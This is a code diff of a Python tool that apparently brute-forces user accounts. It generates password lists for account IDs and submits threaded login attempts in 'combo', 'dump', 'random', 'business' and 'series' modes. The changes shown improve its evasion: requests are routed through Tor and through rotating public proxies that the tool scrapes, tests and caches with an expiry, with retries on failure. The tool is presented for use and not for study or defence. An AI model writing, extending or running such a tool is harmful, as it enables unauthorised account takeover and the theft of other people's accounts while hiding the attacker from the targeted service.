@@ -10,7 +10,8 @@ import random
 import subprocess
 import requests
 from time import sleep
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from concurrent.futures import ThreadPoolExecutor
+
 
 # ===== COLOR CODES =====
 R = '\x1b[38;5;196m'
@@ -21,7 +22,8 @@ P = '\x1b[38;5;201m'
 W = '\x1b[0;97m'
 N = '\x1b[0m'
 
-PROXY_CACHE_FILE = ".proxy_cache.json"
+PROXY_CACHE_FILE = "results/.proxy_cache.json"
+PROXY_EXPIRY = 60 * 60  # 1 hour in seconds
 
 def start_tor():
     try:
@@ -29,59 +31,78 @@ def start_tor():
         sleep(5)
         print(f"{G}[✓] TOR started successfully{N}")
     except Exception as e:
-        print(f"{R}[✗] TOR start error → {str(e)}{N}")
+        print(f"{R}[✗] TOR error: {str(e)}{N}")
 
 def fetch_public_proxies():
-    url = "https://www.proxy-list.download/api/v1/get?type=https"
     try:
-        res = requests.get(url)
-        return res.text.strip().split("\r\n")[:50]
-    except:
+        url = "https://www.proxy-list.download/api/v1/get?type=https"
+        raw = requests.get(url, timeout=10).text
+        return raw.strip().split("\r\n")[:50]
+    except Exception as e:
+        print(f"{R}[!] Proxy fetch failed → {str(e)}{N}")
         return []
 
 def test_proxy(proxy):
     try:
-        res = requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=5)
-        return proxy if res.status_code == 200 else None
+        r = requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=5)
+        return proxy if r.status_code == 200 else None
     except:
         return None
 
 def refresh_proxy_cache():
-    print(f"{Y}[~] Refreshing proxy cache...{N}")
-    proxies = fetch_public_proxies()
-    with ThreadPoolExecutor(max_workers=20) as executor:
-        verified = list(filter(None, executor.map(test_proxy, proxies)))
-    with open(PROXY_CACHE_FILE, "w") as f:
-        json.dump(verified, f)
-    print(f"{G}[✓] {len(verified)} working proxies cached{N}")
+    try:
+        print(f"{Y}[~] Refreshing proxy cache...{N}")
+        proxies = fetch_public_proxies()
+        if not proxies:
+            print(f"{R}[!] No proxies found{N}")
+            return
+
+        with ThreadPoolExecutor(max_workers=20) as executor:
+            tested = executor.map(test_proxy, proxies)
+            verified = [p for p in tested if p]
+
+        cache_data = {"timestamp": time(), "proxies": verified}
+        os.makedirs("results", exist_ok=True)
+        with open(PROXY_CACHE_FILE, "w") as f:
+            json.dump(cache_data, f)
+
+        print(f"{G}[✓] {len(verified)} working proxies cached{N}")
+    except Exception as e:
+        print(f"{R}[✗] Proxy refresh error → {str(e)}{N}")
 
 def load_proxy_cache():
     try:
-        with open(PROXY_CACHE_FILE, "r") as f:
-            return json.load(f)
-    except:
+        if not os.path.exists(PROXY_CACHE_FILE):
+            return []
+        with open(PROXY_CACHE_FILE) as f:
+            data = json.load(f)
+
+        age = time() - data.get("timestamp", 0)
+        if age > PROXY_EXPIRY:
+            print(f"{Y}[~] Proxy cache expired ({int(age)}s old){N}")
+            return []
+
+        return data.get("proxies", [])
+    except Exception as e:
+        print(f"{R}[!] Proxy cache load failed → {str(e)}{N}")
         return []
 
 def get_proxy_pool():
-    if not os.path.exists(PROXY_CACHE_FILE):
-        refresh_proxy_cache()
-    public = load_proxy_cache()
-    return ["socks5://127.0.0.1:9050"] + public
+    return ["socks5://127.0.0.1:9050"] + load_proxy_cache()
 
-def request_with_proxy(url, headers=None, max_retries=3):
+def request_with_proxy(url, headers=None, data=None, max_retries=3):
     proxies = get_proxy_pool()
-    for attempt in range(max_retries):
+    for _ in range(max_retries):
         proxy = random.choice(proxies)
         try:
-            res = requests.get(url, headers=headers, proxies={"http": proxy, "https": proxy}, timeout=7)
-            if res.status_code == 200:
-                print(f"{G}[✓] Proxy success → {proxy}{N}")
-                return res.text
+            r = requests.post(url, headers=headers, data=data,
+                              proxies={"http": proxy, "https": proxy}, timeout=10)
+            return r
         except Exception as e:
-            print(f"{R}[✗] Failed → {proxy} | {str(e)}{N}")
-        sleep(1)
-    print(f"{R}[!] All proxy attempts failed.{N}")
+            print(f"{R}[!] Proxy failed → {str(e)}{N}")
+            sleep(1)
     return None
+
 
 class LogManager:
     @staticmethod
@@ -342,17 +363,30 @@ def start_cloning(self, mode):
             for uid in self.generated_ids:
                 if mode == "combo" and uid in self.combo_pw_map:
                     pwlist = [self.combo_pw_map[uid]]
-                    proxy = random.choice(get_proxy_pool())
-                    pool.submit(self.api_crack_combo, uid, pwlist, proxy)
-                elif mode in ["random", "business", "series", "dump"]:
+                    pool.submit(self.api_crack_combo, uid, pwlist)
+
+                elif mode == "dump":
                     pwlist = self.smart_passwords(uid, self.wordlist)
-                    proxy = random.choice(get_proxy_pool())
-                    pool.submit(self.api_crack_dump, uid, pwlist, proxy)
+                    pool.submit(self.api_crack_dump, uid, pwlist)
+
+                elif mode == "random":
+                    pwlist = self.smart_passwords(uid, self.wordlist)
+                    pool.submit(self.random_method, uid, pwlist)
+
+                elif mode == "business":
+                    pwlist = self.smart_passwords(uid, self.wordlist)
+                    pool.submit(self.business_method, uid, pwlist)
+
+                elif mode == "series":
+                    pwlist = self.smart_passwords(uid, self.wordlist)
+                    pool.submit(self.series_method, uid, pwlist)
+
                 else:
                     print(f"{Y}🧢 Skipped ➤ {uid} [Unknown mode: {mode}]{N}")
         self.summary()
     except Exception as e:
         print(f"{R}[!] Thread error: {str(e)}{N}")
+
 
 
 if __name__ == "__main__":
